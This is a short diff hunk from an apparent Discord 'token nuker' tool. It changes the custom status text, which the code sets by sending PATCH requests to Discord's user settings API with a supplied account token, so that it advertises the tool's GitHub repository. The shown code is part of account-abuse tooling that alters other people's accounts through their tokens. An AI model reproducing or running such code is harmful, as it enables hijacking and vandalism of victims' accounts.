@@ -240,7 +240,7 @@ def vtoken(token):
                 'convert_emoticons': False,
                 'enable_tts_command': False,
                 'explicit_content_filter': '0',
-                "custom_status": {"text": f"https://github.com/meowistic"},
+                "custom_status": {"text": "https://github.com/meowistic/discord-token-nuker"},
                 'status': "idle"
             }
             requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token),
